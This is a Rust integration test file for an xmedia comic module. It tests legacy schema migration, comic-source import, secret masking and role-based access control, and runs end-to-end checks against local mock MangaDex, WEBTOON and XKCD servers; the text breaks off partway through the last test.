use std::collections::HashMap;
use std::io::Cursor;
use std::sync::{Arc, RwLock};

use axum::Router;
use axum::body::{Body, to_bytes};
use axum::extract::{Path as AxumPath, Query};
use axum::http::{HeaderMap, Request, StatusCode, header};
use axum::response::Response;
use axum::routing::get;
use image::{ImageBuffer, ImageFormat, Rgb, Rgba};
use serde::Deserialize;
use tempfile::TempDir;
use toasty::Db;
use toasty::schema::{Model, ModelSet};
use tower::ServiceExt;
use uuid::Uuid;
use xmedia_core::application::auth::AuthService;
use xmedia_core::application::dto::{CreateUserInput, SetupAdminInput};
use xmedia_core::application::library::LibraryService;
use xmedia_core::domain::user::UserRole;
use xmedia_core::infra::events::BroadcastEventHub;
use xmedia_core::infra::persistence::repositories::{
    ToastyLibraryRepository, ToastyUserRepository,
};
use xmedia_core::infra::security::{JwtTokenService, SecurityManager};
use xmedia_core::{ensure_core_schema, register_core_models};

use crate::http::rest_router;
use crate::http::state::ComicHttpState;
use crate::infra::persistence::models::{
    ComicBookmarkModel, ComicChapterModel, ComicChapterProgressModel, ComicFavoriteSeriesModel,
    ComicSeriesModel, ComicSeriesReaderPrefModel, ComicShelfModel,
};
use crate::{
    ensure_comic_schema, init_comic_module, init_comic_module_with_allow_private_ips,
    register_comic_models,
};

fn valid_png_bytes() -> Vec<u8> {
    let img: ImageBuffer<Rgba<u8>, Vec<u8>> =
        ImageBuffer::from_fn(4, 4, |_, _| Rgba([12, 34, 56, 255]));
    let mut out = Cursor::new(Vec::new());
    img.write_to(&mut out, ImageFormat::Png).unwrap();
    out.into_inner()
}

fn valid_jpeg_bytes() -> Vec<u8> {
    let img: ImageBuffer<Rgb<u8>, Vec<u8>> = ImageBuffer::from_fn(4, 4, |_, _| Rgb([200, 100, 50]));
    let mut out = Cursor::new(Vec::new());
    img.write_to(&mut out, ImageFormat::Jpeg).unwrap();
    out.into_inner()
}

struct TestHarness {
    _tmp: TempDir,
    app: Router,
    admin_token: String,
    member_token: String,
}

async fn setup_test_harness(allow_private_ips: bool) -> TestHarness {
    let tmp = TempDir::new().unwrap();
    let db_path = tmp.path().join("comic_online_test.db");
    let db_url = format!("sqlite:{}", db_path.display());

    let mut models = ModelSet::new();
    register_core_models(&mut models);
    register_comic_models(&mut models);
    let mut db = Db::builder().models(models).connect(&db_url).await.unwrap();
    ensure_core_schema(&mut db, &db_url).await.unwrap();
    ensure_comic_schema(&mut db, &db_url).await.unwrap();

    let users = Arc::new(ToastyUserRepository::new(db.clone()));
    let libraries_repo = Arc::new(ToastyLibraryRepository::new(db.clone()));
    let lifecycles = Arc::new(RwLock::new(HashMap::new()));
    let security = Arc::new(SecurityManager::new("comic-online-secret"));
    let tokens = Arc::new(JwtTokenService::new("comic-online-secret", 3600));
    let events = Arc::new(BroadcastEventHub::default());

    let auth = Arc::new(AuthService::new(
        users,
        security,
        tokens,
        lifecycles.clone(),
    ));
    let library_svc = Arc::new(LibraryService::new(
        libraries_repo.clone(),
        events.clone(),
        lifecycles,
    ));

    let comic_services = init_comic_module_with_allow_private_ips(
        db,
        tmp.path(),
        libraries_repo,
        &library_svc,
        events,
        allow_private_ips,
    )
    .unwrap();

    let admin_sess = auth
        .setup_initial_admin(SetupAdminInput {
            username: "admin".into(),
            display_name: Some("Admin".into()),
            password: "adminpassword123".into(),
        })
        .await
        .unwrap();
    let admin = auth.authenticate_jwt(&admin_sess.token).await.unwrap();

    auth.create_user(
        &admin,
        CreateUserInput {
            username: "member".into(),
            display_name: Some("Member".into()),
            password: "memberpassword123".into(),
            role: UserRole::Member,
        },
    )
    .await
    .unwrap();
    let member_sess = auth.login("member", "memberpassword123").await.unwrap();

    let state = ComicHttpState::new(auth, library_svc, comic_services);
    let app = Router::new().nest("/api/v1/comic", rest_router(state));

    TestHarness {
        _tmp: tmp,
        app,
        admin_token: admin_sess.token,
        member_token: member_sess.token,
    }
}

async fn json_request(
    app: &Router,
    method: &str,
    uri: &str,
    token: &str,
    body: Option<serde_json::Value>,
) -> (StatusCode, Vec<u8>) {
    let mut builder = Request::builder()
        .method(method)
        .uri(uri)
        .header(header::AUTHORIZATION, format!("Bearer {token}"));
    let req = if let Some(b) = body {
        builder = builder.header(header::CONTENT_TYPE, "application/json");
        builder.body(Body::from(b.to_string())).unwrap()
    } else {
        builder.body(Body::empty()).unwrap()
    };
    let resp = app.clone().oneshot(req).await.unwrap();
    let status = resp.status();
    let bytes = to_bytes(resp.into_body(), usize::MAX).await.unwrap();
    (status, bytes.to_vec())
}

#[tokio::test]
async fn ensure_comic_schema_migrates_legacy_db_without_comic_sources_preserving_data() {
    let tmp = TempDir::new().unwrap();
    let db_path = tmp.path().join("legacy_migrate.db");
    let db_url = format!("sqlite:{}", db_path.display());

    // 1. Initialize legacy schema WITHOUT ComicSourceRecordModel
    {
        let mut legacy_models = ModelSet::new();
        register_core_models(&mut legacy_models);
        <ComicSeriesModel as Model>::register(&mut legacy_models);
        <ComicChapterModel as Model>::register(&mut legacy_models);
        <ComicChapterProgressModel as Model>::register(&mut legacy_models);
        <ComicSeriesReaderPrefModel as Model>::register(&mut legacy_models);
        <ComicFavoriteSeriesModel as Model>::register(&mut legacy_models);
        <ComicShelfModel as Model>::register(&mut legacy_models);
        <ComicBookmarkModel as Model>::register(&mut legacy_models);
        let mut legacy_db = Db::builder()
            .models(legacy_models)
            .connect(&db_url)
            .await
            .unwrap();
        legacy_db.push_schema().await.unwrap();

        let now = jiff::Timestamp::now();
        toasty::create!(ComicSeriesModel {
            id: Uuid::now_v7(),
            library_id: Uuid::now_v7(),
            title: "Existing Series",
            sort_title: "Existing Series",
            alt_titles: toasty::Json(vec![]),
            summary: "Preserved",
            writers: toasty::Json(vec![]),
            pencillers: toasty::Json(vec![]),
            publisher: None,
            status: "ongoing",
            reading_direction: "rtl",
            age_rating: None,
            genres: toasty::Json(vec![]),
            tags: toasty::Json(vec![]),
            language: None,
            year: None,
            cover_path: None,
            chapter_count: 1,
            source_dir: "/legacy",
            metadata_locked: false,
            created_at: now,
            updated_at: now,
        })
        .exec(&mut legacy_db)
        .await
        .unwrap();
    }

    // 2. Re-open with full comic models and run ensure_comic_schema
    let mut full_models = ModelSet::new();
    register_core_models(&mut full_models);
    register_comic_models(&mut full_models);
    let mut db = Db::builder()
        .models(full_models)
        .connect(&db_url)
        .await
        .unwrap();
    ensure_core_schema(&mut db, &db_url).await.unwrap();
    ensure_comic_schema(&mut db, &db_url).await.unwrap();

    // Verify existing ComicSeriesModel row was preserved
    let series_rows = ComicSeriesModel::all().exec(&mut db).await.unwrap();
    assert_eq!(series_rows.len(), 1);
    assert_eq!(series_rows[0].title, "Existing Series");

    // Verify comic_sources table is now usable
    let repo = crate::infra::persistence::repositories::ToastyComicSourceRepository::new(db);
    assert!(
        crate::domain::repository::ComicSourceRepository::list_all(&repo)
            .await
            .unwrap()
            .is_empty()
    );
}

#[tokio::test]
async fn source_crud_idempotent_seed_import_authz_masking_and_login_action() {
    let h = setup_test_harness(true).await;

    // 1. Import verified seeds/sources/comic.json twice (idempotent)
    let seeds_raw = include_str!("../../../seeds/sources/comic.json");
    let (st1, b1) = json_request(
        &h.app,
        "POST",
        "/api/v1/comic/sources/import",
        &h.admin_token,
        Some(serde_json::json!({ "raw_json": seeds_raw })),
    )
    .await;
    assert_eq!(st1, StatusCode::OK);
    let rep1: serde_json::Value = serde_json::from_slice(&b1).unwrap();
    assert_eq!(rep1["imported_count"], 5);
    assert_eq!(rep1["updated_count"], 0);

    let (st2, b2) = json_request(
        &h.app,
        "POST",
        "/api/v1/comic/sources/import",
        &h.admin_token,
        Some(serde_json::json!({ "raw_json": seeds_raw })),
    )
    .await;
    assert_eq!(st2, StatusCode::OK);
    let rep2: serde_json::Value = serde_json::from_slice(&b2).unwrap();
    assert_eq!(rep2["imported_count"], 0);
    assert_eq!(rep2["updated_count"], 5);

    // 2. Import a login-capable source with sensitive loginInfo + variable
    let custom_source = serde_json::json!({
        "bookSourceName": "Auth Comic",
        "bookSourceUrl": "https://auth-comic.test",
        "bookSourceGroup": "Private",
        "bookSourceType": 2,
        "loginUrl": "@js:cookie.setCookie('https://auth-comic.test','sid=xyz');'logged-in:' + (result.user || '');",
        "loginUi": "[{\"name\":\"user\",\"type\":\"text\"},{\"name\":\"password\",\"type\":\"password\"}]",
        "ruleSearch": { "bookList": "$.items[*]", "name": "$.t", "bookUrl": "$.u" }
    });
    let (st_imp, b_imp) = json_request(
        &h.app,
        "POST",
        "/api/v1/comic/sources/import",
        &h.admin_token,
        Some(serde_json::json!({ "raw_json": custom_source.to_string() })),
    )
    .await;
    assert_eq!(st_imp, StatusCode::OK);
    let imp_val: serde_json::Value = serde_json::from_slice(&b_imp).unwrap();
    let auth_id = imp_val["sources"][0]["id"].as_str().unwrap().to_string();

    // Run login-action with form_data alias & secret password
    let (st_login, b_login) = json_request(
        &h.app,
        "POST",
        &format!("/api/v1/comic/sources/{auth_id}/login-action"),
        &h.admin_token,
        Some(serde_json::json!({
            "form_data": { "user": "alice", "password": "top-secret-password" },
            "action": "source.setVariable('vip_token_123');'ok'"
        })),
    )
    .await;
    assert_eq!(st_login, StatusCode::OK);
    let login_val: serde_json::Value = serde_json::from_slice(&b_login).unwrap();
    assert_eq!(login_val["result"], "ok");
    assert_eq!(login_val["source"]["login_info"]["user"], "alice");
    assert_eq!(login_val["source"]["login_info"]["password"], "••••••••");
    assert_eq!(login_val["source"]["variable_preview"], "vip_token_123");
    assert_eq!(
        login_val["source"]["cookie_hosts"],
        serde_json::json!(["auth-comic.test"])
    );

    // Re-submit masked placeholder -> preserves secret instead of overwriting
    let (st_login2, _) = json_request(
        &h.app,
        "POST",
        &format!("/api/v1/comic/sources/{auth_id}/login-action"),
        &h.admin_token,
        Some(serde_json::json!({
            "login_info": { "user": "alice", "password": "••••••••" },
            "action": "source.getLoginInfoMap().password"
        })),
    )
    .await;
    assert_eq!(st_login2, StatusCode::OK);

    // 3. Disable Auth Comic and verify Admin vs Member visibility & authz
    let (st_patch, b_patch) = json_request(
        &h.app,
        "PATCH",
        &format!("/api/v1/comic/sources/{auth_id}"),
        &h.admin_token,
        Some(serde_json::json!({ "enabled": false, "group_name": "UpdatedGroup", "weight": 77 })),
    )
    .await;
    assert_eq!(st_patch, StatusCode::OK);
    let patch_val: serde_json::Value = serde_json::from_slice(&b_patch).unwrap();
    assert_eq!(patch_val["enabled"], false);
    assert_eq!(patch_val["group_name"], "UpdatedGroup");
    assert_eq!(patch_val["weight"], 77);

    // Verify export preserves bookSourceGroup for Legado source
    let (st_exp, b_exp) = json_request(
        &h.app,
        "GET",
        &format!("/api/v1/comic/sources/{auth_id}/export"),
        &h.admin_token,
        None,
    )
    .await;
    assert_eq!(st_exp, StatusCode::OK);
    let exp_json: serde_json::Value = serde_json::from_slice(&b_exp).unwrap();
    assert_eq!(exp_json["bookSourceGroup"], "UpdatedGroup");
    assert_eq!(exp_json["enabled"], false);

    // Admin GET /sources sees all 6 (including disabled Auth Comic) with masked secrets
    let (st_adm_list, b_adm_list) =
        json_request(&h.app, "GET", "/api/v1/comic/sources", &h.admin_token, None).await;
    assert_eq!(st_adm_list, StatusCode::OK);
    let adm_list: Vec<serde_json::Value> = serde_json::from_slice(&b_adm_list).unwrap();
    assert_eq!(adm_list.len(), 6);

    // Member GET /sources sees ONLY 5 enabled sources, secrets/cookies/variable stripped
    let (st_mem_list, b_mem_list) = json_request(
        &h.app,
        "GET",
        "/api/v1/comic/sources",
        &h.member_token,
        None,
    )
    .await;
    assert_eq!(st_mem_list, StatusCode::OK);
    let mem_list: Vec<serde_json::Value> = serde_json::from_slice(&b_mem_list).unwrap();
    assert_eq!(mem_list.len(), 5);
    assert!(mem_list.iter().all(|s| s["enabled"] == true
        && s["login_info"].as_object().unwrap().is_empty()
        && s["login_ui"].as_array().unwrap().is_empty()
        && s["cookie_hosts"].as_array().unwrap().is_empty()
        && s["variable_preview"] == ""));

    // Member receives 403 Forbidden on all admin routes & disabled source access
    for (m, u, b) in [
        (
            "POST",
            "/api/v1/comic/sources/import",
            Some(serde_json::json!({"raw_json":"{}"})),
        ),
        (
            "POST",
            "/api/v1/comic/sources/reorder",
            Some(serde_json::json!({"ordered_ids":[]})),
        ),
        (
            "POST",
            "/api/v1/comic/sources/batch",
            Some(serde_json::json!({"ids":[auth_id],"action":"enable"})),
        ),
        (
            "POST",
            "/api/v1/comic/sources/export-batch",
            Some(serde_json::json!({"ids":[auth_id]})),
        ),
        (
            "PATCH",
            &format!("/api/v1/comic/sources/{auth_id}"),
            Some(serde_json::json!({"enabled":true})),
        ),
        ("DELETE", &format!("/api/v1/comic/sources/{auth_id}"), None),
        (
            "GET",
            &format!("/api/v1/comic/sources/{auth_id}/export"),
            None,
        ),
        (
            "GET",
            &format!("/api/v1/comic/sources/{auth_id}/variable"),
            None,
        ),
        (
            "POST",
            &format!("/api/v1/comic/sources/{auth_id}/login-action"),
            Some(serde_json::json!({"login_info":{}})),
        ),
        (
            "POST",
            &format!("/api/v1/comic/sources/{auth_id}/test"),
            Some(serde_json::json!({"mode":"search"})),
        ),
        (
            "POST",
            "/api/v1/comic/online/detail",
            Some(
                serde_json::json!({"source_id": auth_id, "comic_url": "https://auth-comic.test/1"}),
            ),
        ),
    ] {
        let (st, _) = json_request(&h.app, m, u, &h.member_token, b).await;
        assert_eq!(st, StatusCode::FORBIDDEN, "expected 403 on {m} {u}");
    }

    // Member also gets 403 on image-proxy when referencing a disabled source_id
    let proxy_req = Request::builder()
        .uri(format!(
            "/api/v1/comic/online/image-proxy?source_id={auth_id}&url=https://auth-comic.test/p.png"
        ))
        .header(header::AUTHORIZATION, format!("Bearer {}", h.member_token))
        .body(Body::empty())
        .unwrap();
    let proxy_resp = h.app.clone().oneshot(proxy_req).await.unwrap();
    assert_eq!(proxy_resp.status(), StatusCode::FORBIDDEN);

    // Admin variable, export-batch, reorder, batch, delete
    let (st_var, b_var) = json_request(
        &h.app,
        "GET",
        &format!("/api/v1/comic/sources/{auth_id}/variable"),
        &h.admin_token,
        None,
    )
    .await;
    assert_eq!(st_var, StatusCode::OK);
    let var_json: serde_json::Value = serde_json::from_slice(&b_var).unwrap();
    assert_eq!(var_json["variable"], "vip_token_123");

    let (st_eb, b_eb) = json_request(
        &h.app,
        "POST",
        "/api/v1/comic/sources/export-batch",
        &h.admin_token,
        Some(serde_json::json!({ "ids": [auth_id] })),
    )
    .await;
    assert_eq!(st_eb, StatusCode::OK);
    let eb_arr: Vec<serde_json::Value> = serde_json::from_slice(&b_eb).unwrap();
    assert_eq!(eb_arr.len(), 1);

    let (st_reord, _) = json_request(
        &h.app,
        "POST",
        "/api/v1/comic/sources/reorder",
        &h.admin_token,
        Some(serde_json::json!({ "ordered_ids": [auth_id] })),
    )
    .await;
    assert_eq!(st_reord, StatusCode::OK);

    let (st_batch, b_batch) = json_request(
        &h.app,
        "POST",
        "/api/v1/comic/sources/batch",
        &h.admin_token,
        Some(serde_json::json!({ "ids": [auth_id], "action": "delete" })),
    )
    .await;
    assert_eq!(st_batch, StatusCode::OK);
    let batch_rep: serde_json::Value = serde_json::from_slice(&b_batch).unwrap();
    assert_eq!(batch_rep["affected_count"], 1);
}

#[derive(Deserialize)]
struct MdSearchQuery {
    offset: Option<u32>,
}

#[derive(Deserialize)]
struct WebtoonListQuery {
    sort: Option<String>,
    page: Option<u32>,
}

#[tokio::test]
async fn mock_mangadex_webtoon_xkcd_full_e2e_replay_and_test_modes() {
    let png = valid_png_bytes();
    let jpeg = valid_jpeg_bytes();
    let png_md = png.clone();
    let jpeg_wt = jpeg.clone();
    let png_xkcd = png.clone();

    let mock_app = Router::new()
        // --- MangaDex API v5 ---
        .route(
            "/manga",
            get(|headers: HeaderMap, Query(q): Query<MdSearchQuery>| async move {
                let ua = headers
                    .get(header::USER_AGENT)
                    .and_then(|v| v.to_str().ok())
                    .unwrap_or("");
                if ua != "xmedia/0.1.0" {
                    return Response::builder()
                        .status(StatusCode::OK)
                        .header("content-type", "text/html")
                        .body(Body::from("<html>bot challenge</html>"))
                        .unwrap();
                }
                let offset = q.offset.unwrap_or(0);
                let payload = serde_json::json!({
                    "result": "ok",
                    "data": [{
                        "id": format!("md-yotsuba-{offset}"),
                        "attributes": {
                            "title": { "ja-ro": "Yotsuba to!" },
                            "altTitles": [{ "en": format!("Yotsuba&! (off={offset})") }],
                            "description": { "en": "Slice of life manga" },
                            "tags": [{ "attributes": { "name": { "en": "Comedy" } } }]
                        },
                        "relationships": [
                            { "type": "author", "attributes": { "name": "Azuma Kiyohiko" } },
                            { "type": "cover_art", "attributes": { "fileName": "cov1.jpg" } }
                        ]
                    }]
                });
                Response::builder()
                    .status(StatusCode::OK)
                    .header("content-type", "application/json")
                    .body(Body::from(payload.to_string()))
                    .unwrap()
            }),
        )
        .route(
            "/manga/{id}",
            get(|AxumPath(id): AxumPath<String>| async move {
                let payload = serde_json::json!({
                    "result": "ok",
                    "data": {
                        "id": id,
                        "attributes": {
                            "title": { "ja-ro": "Yotsuba to!" },
                            "altTitles": [{ "en": "Yotsuba&!" }],
                            "description": { "en": "Detailed description" },
                            "status": "ongoing",
                            "tags": [{ "attributes": { "name": { "en": "Slice of Life" } } }]
                        },
                        "relationships": [
                            { "type": "author", "attributes": { "name": "Azuma Kiyohiko" } },
                            { "type": "cover_art", "attributes": { "fileName": "cov_detail.jpg" } }
                        ]
                    }
                });
                Response::builder()
                    .status(StatusCode::OK)
                    .header("content-type", "application/json")
                    .body(Body::from(payload.to_string()))
                    .unwrap()
            }),
        )
        .route(
            "/manga/{id}/feed",
            get(|Query(q): Query<MdSearchQuery>| async move {
                let offset = q.offset.unwrap_or(0);
                let data = if offset == 0 {
                    serde_json::json!([
                        { "id": "ch-ext", "attributes": { "volume": "1", "chapter": "0", "title": "External", "externalUrl": "https://mangaplus.example", "pages": 10, "readableAt": "2026-01-01T00:00:00Z" } },
                        { "id": "ch-1", "attributes": { "volume": "1", "chapter": "1", "title": "Moving", "externalUrl": null, "pages": 2, "readableAt": "2026-01-02T00:00:00Z" } }
                    ])
                } else {
                    serde_json::json!([
                        { "id": "ch-2", "attributes": { "volume": "1", "chapter": "2", "title": null, "externalUrl": null, "pages": 1, "readableAt": "2026-01-03T00:00:00Z" } }
                    ])
                };
                let payload = serde_json::json!({
                    "data": data,
                    "limit": 100,
                    "offset": offset,
                    "total": 150
                });
                Response::builder()
                    .status(StatusCode::OK)
                    .header("content-type", "application/json")
                    .body(Body::from(payload.to_string()))
                    .unwrap()
            }),
        )
        .route(
            "/at-home/server/{id}",
            get(|headers: HeaderMap| async move {
                let host = headers
                    .get(header::HOST)
                    .and_then(|v| v.to_str().ok())
                    .unwrap_or("127.0.0.1");
                let payload = serde_json::json!({
                    "baseUrl": format!("http://{host}"),
                    "chapter": {
                        "hash": "abc123",
                        "dataSaver": ["page1.png", "page2.png"]
                    }
                });
                Response::builder()
                    .status(StatusCode::OK)
                    .header("content-type", "application/json")
                    .body(Body::from(payload.to_string()))
                    .unwrap()
            }),
        )
        .route(
            "/data-saver/abc123/{file}",
            get(move |headers: HeaderMap| {
                let bytes = png_md.clone();
                async move {
                    let ua = headers
                        .get(header::USER_AGENT)
                        .and_then(|v| v.to_str().ok())
                        .unwrap_or("");
                    if ua != "xmedia/0.1.0" {
                        return Response::builder()
                            .status(StatusCode::FORBIDDEN)
                            .body(Body::from("bad ua"))
                            .unwrap();
                    }
                    Response::builder()
                        .status(StatusCode::OK)
                        .header("content-type", "image/png")
                        .body(Body::from(bytes))
                        .unwrap()
                }
            }),
        )
        // --- WEBTOON EN ---
        .route(
            "/en/search",
            get(|headers: HeaderMap| async move {
                let ua = headers
                    .get(header::USER_AGENT)
                    .and_then(|v| v.to_str().ok())
                    .unwrap_or("");
                if !ua.contains("Windows NT 10.0") {
                    return Response::builder()
                        .status(StatusCode::OK)
                        .header("content-type", "text/html")
                        .body(Body::from("<div>m.webtoons.com mobile</div>"))
                        .unwrap();
                }
                Response::builder()
                    .status(StatusCode::OK)
                    .header("content-type", "text/html")
                    .body(Body::from(
                        r#"<ul class="webtoon_list">
                            <li>
                                <a href="/en/fantasy/tog/list?title_no=8136">
                                    <img src="/wt/cover.jpg">
                                    <p class="title">Tower of God</p>
                                    <p class="author">SIU</p>
                                    <p class="genre">Fantasy</p>
                                </a>
                            </li>
                        </ul>"#,
                    ))
                    .unwrap()
            }),
        )
        .route(
            "/en/originals",
            get(|| async {
                Response::builder()
                    .status(StatusCode::OK)
                    .header("content-type", "text/html")
                    .body(Body::from(
                        r#"<ul class="webtoon_list">
                            <li>
                                <a href="/en/fantasy/tog/list?title_no=8136">
                                    <img src="/wt/cover.jpg">
                                    <p class="title">Originals ToG</p>
                                    <p class="genre">Fantasy</p>
                                </a>
                            </li>
                        </ul>"#,
                    ))
                    .unwrap()
            }),
        )
        .route(
            "/en/fantasy/tog/list",
            get(|Query(q): Query<WebtoonListQuery>| async move {
                if q.sort.is_none() {
                    return Response::builder()
                        .status(StatusCode::OK)
                        .header("content-type", "text/html")
                        .body(Body::from(
                            r#"<html><head><meta property="og:image" content="/wt/og.jpg"></head><body>
                                <div class="detail_header">
                                    <h1 class="subj">Tower of God</h1>
                                    <div class="author_area">SIU<button class="ico_info2">author info</button></div>
                                    <h2 class="genre">Fantasy</h2>
                                </div>
                                <p class="summary">Climb the tower</p>
                                <p class="day_info">EVERY SUNDAY</p>
                            </body></html>"#,
                        ))
                        .unwrap();
                }
                assert_eq!(q.sort.as_deref(), Some("oldest"));
                let page = q.page.unwrap_or(1);
                let html = if page == 1 {
                    r##"<html><head><meta property="og:image" content="/wt/og.jpg"></head><body>
                        <div class="detail_header">
                            <h1 class="subj">Tower of God</h1>
                            <div class="author_area">SIU<button class="ico_info2">author info</button></div>
                            <h2 class="genre">Fantasy</h2>
                        </div>
                        <p class="summary">Climb the tower</p>
                        <p class="day_info">EVERY SUNDAY</p>
                        <ul id="_listUl">
                            <li class="_episodeItem"><a href="/en/fantasy/tog/ep1/viewer"><span class="subj"><span>Ep. 1</span></span><span class="date">2025-07-08</span></a></li>
                        </ul>
                        <div class="paginate"><a aria-current="true" href="#">1</a><a href="/en/fantasy/tog/list?title_no=8136&sort=oldest&page=2">2</a></div>
                    </body></html>"##
                } else {
                    r##"<html><body>
                        <ul id="_listUl">
                            <li class="_episodeItem"><a href="/en/fantasy/tog/ep2/viewer"><span class="subj"><span>Ep. 2</span></span><span class="date">2025-07-15</span></a></li>
                        </ul>
                        <div class="paginate"><a href="?page=1">1</a><a aria-current="true" href="#">2</a><span class="pg_next off"></span></div>
                    </body></html>"##
                };
                Response::builder()
                    .status(StatusCode::OK)
                    .header("content-type", "text/html")
                    .body(Body::from(html))
                    .unwrap()
            }),
        )
        .route(
            "/en/fantasy/tog/ep1/viewer",
            get(|| async {
                Response::builder()
                    .status(StatusCode::OK)
                    .header("content-type", "text/html")
                    .body(Body::from(
                        r#"<div id="_imageList">
                            <img class="_images" data-url="/wt-cdn/p1.jpg">
                            <img class="_images" data-url="/wt-cdn/p2.jpg">
                        </div>
                        <div class="bottom_carousel">
                            <img data-url="/wt-cdn/carousel_ignore.jpg">
                        </div>"#,
                    ))
                    .unwrap()
            }),
        )
        .route(
            "/wt-cdn/{file}",
            get(move |headers: HeaderMap| {
                let bytes = jpeg_wt.clone();
                async move {
                    let referer = headers
                        .get(header::REFERER)
                        .and_then(|v| v.to_str().ok())
                        .unwrap_or("");
                    if referer != "https://www.webtoons.com/" {
                        return Response::builder()
                            .status(StatusCode::FORBIDDEN)
                            .body(Body::from("hotlink forbidden"))
                            .unwrap();
                    }
                    Response::builder()
                        .status(StatusCode::OK)
                        .header("content-type", "image/jpeg")
                        .body(Body::from(bytes))
                        .unwrap()
                }
            }),
        )
        // --- XKCD ---
        .route(
            "/archive/",
            get(|| async {
                Response::builder()
                    .status(StatusCode::OK)
                    .header("content-type", "text/html")
                    .body(Body::from(
                        r#"<a href="/3327/" title="2026-11-20">Plate Maintenance</a><br/><a href="/1/" title="2006-01-01">Barrel - Part 1</a>"#,
                    ))
                    .unwrap()
            }),
        )
        .route(
            "/3327/info.0.json",
            get(|headers: HeaderMap| async move {
                let host = headers
                    .get(header::HOST)
                    .and_then(|v| v.to_str().ok())
                    .unwrap_or("127.0.0.1");
                let payload = serde_json::json!({
                    "num": 3327,
                    "safe_title": "Plate Maintenance",
                    "img": format!("http://{host}/comics/plate.png"),
                    "alt": "Comic alt text",
                    "year": "2026",
                    "month": "11",
                    "day": "20"
                });
                Response::builder()
                    .status(StatusCode::OK)
                    .header("content-type", "application/json")
                    .body(Body::from(payload.to_string()))
                    .unwrap()
            }),
        )
        .route(
            "/comics/plate.png",
            get(move || {
                let bytes = png_xkcd.clone();
                async move {
                    Response::builder()
                        .status(StatusCode::OK)
                        .header("content-type", "image/png")
                        .body(Body::from(bytes))
                        .unwrap()
                }
            }),
        );

    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    let server = tokio::spawn(async move {
        axum::serve(listener, mock_app).await.unwrap();
    });
    let base = format!("http://{addr}");

    // Rewrite seed URLs to our local mock server while keeping exact rule expressions!
    let seeds_raw = include_str!("../../../seeds/sources/comic.json")
        .replace("https://api.mangadex.org", &base)
        .replace("https://uploads.mangadex.org", &base)
        .replace("https://www.webtoons.com/", &format!("{base}/"))
        .replace("https://www.webtoons.com", &base)
        .replace("https://xkcd.com/", &format!("{base}/"))
        .replace("https://xkcd.com", &base);

    // Note: WEBTOON Referer inside header/imageHeader was replaced above; restore exact Referer header value
    // so the mock server checks exact "https://www.webtoons.com/"!
    let mut seed_arr: Vec<serde_json::Value> = serde_json::from_str(&seeds_raw).unwrap();
    for item in &mut seed_arr {
        if item["sourceName"]
            .as_str()
            .is_some_and(|n| n.starts_with("WEBTOON"))
        {
            item["header"] = serde_json::Value::String(
                "{\"User-Agent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36\",\"Referer\":\"https://www.webtoons.com/\"}".into(),
            );
            item["imageHeader"] = serde_json::Value::String(
                "{\"User-Agent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36\",\"Referer\":\"https://www.webtoons.com/\"}".into(),
            );
        }
    }
    let rewritten_json = serde_json::to_string(&seed_arr).unwrap();

    let h = setup_test_harness(true).await;
    let (st_imp, b_imp) = json_request(
        &h.app,
        "POST",
        "/api/v1/comic/sources/import",
        &h.admin_token,
        Some(serde_json::json!({ "raw_json": rewritten_json })),
    )
    .await;
    assert_eq!(st_imp, StatusCode::OK);
    let imp_val: serde_json::Value = serde_json::from_slice(&b_imp).unwrap();
    let sources = imp_val["sources"].as_array().unwrap();
    let md_id = sources[0]["id"].as_str().unwrap().to_string();
    let wt_id = sources[2]["id"].as_str().unwrap().to_string();
    let xkcd_id = sources[4]["id"].as_str().unwrap().to_string();

    // 1. MangaDex EN full E2E
    let (st_s, b_s) = json_request(
        &h.app,
        "POST",
        "/api/v1/comic/online/search",
        &h.member_token,
        Some(serde_json::json!({ "keyword": "Yotsuba", "source_ids": [md_id], "page": 1 })),
    )
    .await;
    assert_eq!(st_s, StatusCode::OK);
    let md_search: serde_json::Value = serde_json::from_slice(&b_s).unwrap();
    assert_eq!(md_search["results"][0]["title"], "Yotsuba&! (off=0)");
    assert_eq!(md_search["results"][0]["author"], "Azuma Kiyohiko");
    let md_comic_url = md_search["results"][0]["comic_url"].as_str().unwrap();

    let (st_exp, b_exp) = json_request(
        &h.app,
        "POST",
        "/api/v1/comic/online/explore",
        &h.member_token,
        Some(serde_json::json!({ "source_id": md_id, "page": 2 })),
    )
    .await;
    assert_eq!(st_exp, StatusCode::OK);
    let md_exp: serde_json::Value = serde_json::from_slice(&b_exp).unwrap();
    assert_eq!(md_exp["categories"].as_array().unwrap().len(), 3);
    assert_eq!(md_exp["items"][0]["title"], "Yotsuba&! (off=20)");

    let (st_det, b_det) = json_request(
        &h.app,
        "POST",
        "/api/v1/comic/online/detail",
        &h.member_token,
        Some(serde_json::json!({ "source_id": md_id, "comic_url": md_comic_url })),
    )
    .await;
    assert_eq!(st_det, StatusCode::OK);
    let md_det: serde_json::Value = serde_json::from_slice(&b_det).unwrap();
    assert_eq!(md_det["detail"]["reading_direction"], "rtl");
    // External chapter was filtered out; 2 paginated chapters remain
    assert_eq!(md_det["chapters"].as_array().unwrap().len(), 2);
    assert_eq!(md_det["chapters"][0]["title"], "Vol.1 Ch.1 Moving");
    assert_eq!(md_det["chapters"][1]["title"], "Vol.1 Ch.2");
    let md_toc_url = md_det["detail"]["toc_url"].as_str().unwrap();
    let md_ch_url = md_det["chapters"][0]["url"].as_str().unwrap();

    // Direct POST /online/chapters call
    let (st_ch, b_ch) = json_request(
        &h.app,
        "POST",
        "/api/v1/comic/online/chapters",
        &h.member_token,
        Some(serde_json::json!({ "source_id": md_id, "toc_url": md_toc_url })),
    )
    .await;
    assert_eq!(st_ch, StatusCode::OK);
    let md_ch_resp: serde_json::Value = serde_json::from_slice(&b_ch).unwrap();
    assert_eq!(md_ch_resp["chapters"].as_array().unwrap().len(), 2);
    assert!(
        md_ch_resp["diagnostics"]["logs"]
            .as_array()
            .unwrap()
            .is_empty()
    );

    let (st_pg, b_pg) = json_request(
        &h.app,
        "POST",
        "/api/v1/comic/online/pages",
        &h.member_token,
        Some(serde_json::json!({ "source_id": md_id, "chapter_url": md_ch_url })),
    )
    .await;
    assert_eq!(st_pg, StatusCode::OK);
    let md_pg: serde_json::Value = serde_json::from_slice(&b_pg).unwrap();
    assert_eq!(md_pg["reading_direction"], "rtl");
